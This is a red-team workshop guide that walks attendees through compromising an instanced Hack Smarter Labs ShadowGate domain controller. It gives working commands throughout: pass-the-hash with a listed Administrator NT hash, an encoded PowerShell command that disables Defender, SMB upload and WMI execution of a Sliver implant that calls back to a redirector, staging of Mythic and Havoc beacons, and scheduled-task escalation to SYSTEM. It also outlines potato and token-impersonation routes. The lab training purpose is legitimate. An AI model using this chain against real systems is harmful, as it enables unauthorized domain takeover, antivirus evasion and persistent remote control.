# redStack: Boot-To-Breach Red Team Platform (ShadowGate Attack Path, Tunneled Access)

The hands-on attack chain: from a deployed lab and validated C2 to a Sliver beacon on ShadowGate and SYSTEM on the domain controller. Every attendee runs this against their own instanced ShadowGate. Picks up where CONFIG leaves off (three heartbeat beacons live, Sliver HTTPS listener up).

> Authorization: this runs only against a Hack Smarter Labs ShadowGate instance you are subscribed to, on a per-user instanced connection. No other target.

| At a glance   |                                                                          |
| ------------- | ------------------------------------------------------------------------ |
| Depends on    | DEPLOY (tunnel up, target reachable) + CONFIG (Sliver listener live)     |
| Format        | Hands-on, every attendee against their own instanced ShadowGate         |
| Target        | `DC01.shadow.gate` at `<ShadowGate IP>` (Windows Server 2022 DC)             |
| C2            | Sliver drives; Mythic and Havoc beacons staged on the target through it |
| Two paths     | Operator to target over the tunnel; target to redirector over the public EIP |
| End state     | SYSTEM on ShadowGate via Sliver, all three C2s landed, then teardown    |

---

## How traffic flows in this phase (read this first)

Two directions, two different paths. Getting them straight is what makes the beacon land.

Operator to target (recon, delivery) goes through the tunnel: your internal host (Kali) routes the target CIDR `10.1.0.0/16` via the Guacamole ENI, through WireGuard to the redirector, out the redirector's OpenVPN `tun0` into the HSL range. This is how you reach and deliver to ShadowGate.

Target to redirector (the beacon callback) does not use the tunnel. ShadowGate calls back out its own internet egress to the redirector public Elastic IP on 443, exactly like the Windows test beacon in CONFIG. HSL does not route VPN client IPs back to the target, so the `tun0` IP is never a valid callback. The Sliver implant must call `https://<REDIR_PUBLIC_IP>/cloud/storage/objects/`.

So: you push in over the tunnel, the beacon comes back over the public internet to the redirector. Both must work.

---

## Preconditions

Confirm before starting. If any fails, fix it in DEPLOY or CONFIG before continuing.

Tunnel up and target reachable (from DEPLOY Phase 3). From the redirector (Guacamole > Redirector SSH):

```bash
ping -c3 <ShadowGate IP>
```

Sliver listener live (from CONFIG Phase A). In the Sliver console:

```text
jobs
```

Should list the HTTPS listener on port 443.

Target IP. ShadowGate's address is per-instance and changes by location, so this guide writes it as `<ShadowGate IP>` instead of a fixed value. Read your assigned address off the HSL portal for your instance and substitute it everywhere `<ShadowGate IP>` appears. Confirm it falls inside the `vpn_tunnel_cidrs` you set (`10.1.0.0/16` by default); if your address sits in a different range, change the CIDR to contain it.

---

## Phase 1: Recon

From Kali (Guacamole > Kali SSH), confirm the tunnel routes to the target and fingerprint it.

Confirm `10.1.0.0/16` routes via the Guacamole ENI:

```bash
ip route
```

Fingerprint DC01 (SMB, Kerberos, LDAP, AD CS web enrollment):

```bash
nmap -Pn -sC -sV <ShadowGate IP>
```

Add the host entry so domain tooling resolves names:

```bash
echo '<ShadowGate IP>  DC01.shadow.gate shadow.gate DC01' | sudo tee -a /etc/hosts
```

Success: nmap returns the domain controller's services (53, 88, 389, 445, 636, 5985 and the AD CS HTTP endpoint). The tunnel is carrying operator traffic.

If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (reachability to the target) and that `<ShadowGate IP>` falls inside your `vpn_tunnel_cidrs`.

---

## Phase 2: Domain compromise (whitecarded)

The black-box path from zero credentials to Domain Admin is about 40 minutes of AD tradecraft, and it is not what this workshop teaches, so it is whitecarded. The full sequence is in the box creator's walkthrough (https://notes.rosskeddy.ca/cheatsheet/writeups/hacksmarter/shadowgate). You start from its endpoint:

- Target: `DC01.shadow.gate` at `<ShadowGate IP>`
- `Administrator` NT hash: `4366ec0f86e29be2a4a5e87a1ba922ec`

On a domain controller, Domain Admin is local admin, which is what makes the delivery and SYSTEM escalation below work. In one line, the whitecarded chain is: anonymous SMB user enumeration, AS-REP roast of `jtrueblood`, shadow-credential takeover of `bbrown` through a GenericWrite, an ESC8 NTLM relay to AD CS Web Enrollment coerced with PetitPotam to mint a `DC01$` certificate, then DCSync to recover the `Administrator` hash shown above.

---

## Phase 3: Deliver and land the Sliver beacon

Four commands take you from the whitecarded hash to a beacon on the DC. It calls back to the redirector public EIP over 443, the same path CONFIG proved with the heartbeat. Reuse the Sliver implant from CONFIG Step A3 (`/tmp/sysProxy.exe` on the Sliver host, same `redstack` profile and callback); no regenerate step here.

1. Pull the CONFIG implant to Kali, where the delivery tooling runs (lab password from `deployment_info`):

```bash
scp admin@sliver:/tmp/sysProxy.exe .
```

2. Disable Defender on the DC (pass-the-hash, `-nooutput` because AV deletes the wmiexec output file). The encoded command is `Set-MpPreference -DisableRealtimeMonitoring 1`:

```bash
impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
```

Success: Defender is disabled so now we can smuggle in our implant. 

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[abstract]
class __PARAMETERS 
{
        [Out(True)]
        [MappingStrings(['Win32API|Process and Thread Functions|CreateProcess|lpProcessInformation|dwProcessId'])]
        [ID(3)]
        uint32 ProcessId = 2508

        [out(True)]
        uint32 ReturnValue = 0


}
```

3. Upload the beacon with smbmap (nxc can time out on the 35 MB binary):

```bash
smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./sysProxy.exe 'C$/Windows/Temp/sysProxy.exe'
```

Success:
```bash
[*] Detected 1 hosts serving SMB                                              
[*] Established 1 SMB connections(s) and 1 authenticated session(s)     
[+] Starting upload: ./sysProxy.exe (37335552 bytes)
[+] Upload complete..
[*] Closed 1 connections   
```

4. Execute it:

```bash
impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'C:\Windows\Temp\sysProxy.exe'
```

Success: Implant has been executed on the host

```bash
[abstract]
class __PARAMETERS 
{
        [Out(True)]
        [MappingStrings(['Win32API|Process and Thread Functions|CreateProcess|lpProcessInformation|dwProcessId'])]
        [ID(3)]
        uint32 ProcessId = 624

        [out(True)]
        uint32 ReturnValue = 0


}
```

Confirm the session in Sliver:

```text
sessions
use [SESSION_ID]
whoami
ps
```

Success: a new session from `<ShadowGate IP>` registers and `whoami` returns `SHADOW\Administrator`. This is the beacon, separate from the Windows heartbeat.

If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.

---

## Phase 4: Stage Mythic and Havoc through the Sliver beacon

With a foothold on the DC, stage the other two C2s through it instead of going back to SMB. The Sliver beacon carries them in, and because they run as children of the Administrator beacon they call back as Administrator too. All three frameworks end up with a beacon on the target.

The Apollo and Havoc implants are the CONFIG builds (Phase B and C), pointed at the redirector public EIP on 443, so their callbacks work on the DC unchanged. Push them from the Windows operator (where CONFIG left them) to the Sliver host. Windows Server 2022 ships the OpenSSH client:

These are the CONFIG builds (`msDiag.exe` from Phase B, `hlpUpdate.exe` from Phase C). Use MobaXTerm to upload them to the Slivers /tmp directory or SCP each one at a time:

```powershell
scp C:\Users\Administrator\Desktop\msDiag.exe admin@sliver:/tmp/
```

```powershell
scp C:\Users\Administrator\Desktop\hlpUpdate.exe admin@sliver:/tmp/
```

In sliver-client, select the Administrator session, then upload both to the DC and execute. Run these one at a time, not as a block: Sliver errors on pasted multi-command input. Use forward slashes on the upload target, and no `-o` on execute (with `-o` it blocks on a beacon that never returns):

```text
use [SHADOWGATE_SESSION_ID]
```

```text
upload /tmp/msDiag.exe C:/Windows/Temp/msDiag.exe
```

```text
upload /tmp/hlpUpdate.exe C:/Windows/Temp/hlpUpdate.exe
```

```text
execute C:\\Windows\\Temp\\msDiag.exe
```

```text
execute C:\\Windows\\Temp\\hlpUpdate.exe
```

Success: Apollo registers in Mythic's Active Callbacks and the demon in Havoc's Sessions tab, both as `SHADOW\Administrator`. All three C2s now hold an Administrator beacon on the DC, staged entirely through the Sliver foothold, no SMB or pass-the-hash needed after the first beacon.

If it fails: if a beacon does not appear, Defender may have caught the less-obfuscated payload; re-run the Defender disable from Phase 3 and re-execute. Confirm the files uploaded with `ls C:/Windows/Temp/`.

---

## Phase 5: Escalate Sliver to SYSTEM

Do not use `getsystem` here. Sliver's `getsystem` spawns a new SYSTEM implant that has to make its own callback, and that spawned callback does not survive the HSL egress path (it never registers). Use a scheduled task instead: it runs as SYSTEM and launches the beacon you already dropped, which reaches the redirector over the callback that already works.

From the Administrator beacon, create and run the task. Sliver's `execute` treats `\` as an escape, so double the backslashes in the path or it lands mangled:

```text
execute -o schtasks.exe /create /tn svcpub /tr C:\\Windows\\Temp\\sysProxy.exe /sc once /st 00:00 /ru SYSTEM /f
```

```text
execute -o schtasks.exe /run /tn svcpub
```

Check the `Execute:` echo shows `C:\Windows\Temp\sysProxy.exe` with single backslashes. The `/ST earlier than current time` warning is harmless since `/run` triggers it manually.

A new session registers within a callback interval. In the session list it shows as `SHADOW\DC01$` (a LocalSystem process presents the machine account over the network), but the local token is SYSTEM. Confirm:

```text
use [NEW_SESSION_ID]
getuid
```

Success: `getuid` returns `S-1-5-18`. That is `NT AUTHORITY\SYSTEM` on the domain controller.

Clean up the task:

```text
execute -o schtasks.exe /delete /tn svcpub /f
```

If it fails: if the new session never appears, re-confirm the task path echoed with correct backslashes, and that Defender realtime is still off (re-run the disable from Phase 3 step 3).

---

## BONUS ROUND: The SYSTEM exercise

SYSTEM on `DC01` via Sliver is done: Phase 5 took the Administrator beacon to SYSTEM with a scheduled task. Now do the same in the other two frameworks.

Your turn. The Mythic and Havoc beacons from Phase 4 are sitting at Administrator on the same DC, and every one of them holds `SeImpersonatePrivilege`, so the token-abuse ("potato") family is open to you. Land a SYSTEM callback in Mythic and Havoc as well. Some routes to try:

- Mythic (Apollo): GodPotato, run through Apollo's `execute_assembly` (or SigmaPotato, https://github.com/tylerdotrar/SigmaPotato, a GodPotato successor built for reflective in-memory loading). It abuses `SeImpersonatePrivilege` over DCOM, so it needs no Print Spooler and works cleanly on a domain controller.
- Havoc: Havoc's built-in `token steal` does not work on this box, because on a hardened Server 2022 DC the only SYSTEM tokens live in protected lsass and cannot be duplicated. Two things do work: 
	- A token-impersonation BOF is the clean in-session option: Mr.Un1k0d3r's Elevate-System-Trusted BOF (`github.com/Mr-Un1k0d3r/Elevate-System-Trusted-BOF`), run with `inline-execute`, impersonates winlogon's SYSTEM token via `SetThreadToken` and flips the demon to SYSTEM (and TrustedInstaller) with no new callback. 
	- Or stay in the potato family: a DCOM-based potato (SigmaPotato or GodPotato) coerces a fresh SYSTEM token. Avoid PrintSpoofer here, the Print Spooler is usually off on a DC.

The point is that once you hold `SeImpersonatePrivilege`, SYSTEM is a token away, and each C2 exposes a slightly different way to spend it.

---

## Phase 7: Teardown and cost

The workshop ends here. Tear the stack down; it is what stops all charges. Run destroy from `redStack/terraform/`, the same directory you applied from:

```bash
cd redStack/terraform
terraform destroy
```

Type `yes`. It releases both Elastic IPs, terminates the instances, and removes the VPCs (~5 min). Stopping instances instead of destroying leaves EBS volumes and Elastic IPs billing 24/7.

Confirm a real teardown: it ends with `Destroy complete! Resources: NN destroyed.` (NN nonzero), and `terraform state list` then comes back empty:

```bash
terraform state list
```

Run from the wrong directory and Terraform finds no state, reports `0 destroyed` / `No objects need to be destroyed`, and your infra keeps billing. `0 destroyed` is not a successful teardown; `cd` into `redStack/terraform/` and run again.

Also disconnect the HSL side and confirm your CloudWatch billing alarm cleared.

---

## Where this ends

ShadowGate under SYSTEM via a Sliver beacon that traversed the redirector, with Mythic and Havoc beacons staged through that same foothold and their SYSTEM step left to the attendee, then a clean teardown. That is the full boot-to-breach arc: DEPLOY stood up the platform, CONFIG proved all three callback paths, ATTACK used all three against a live target.
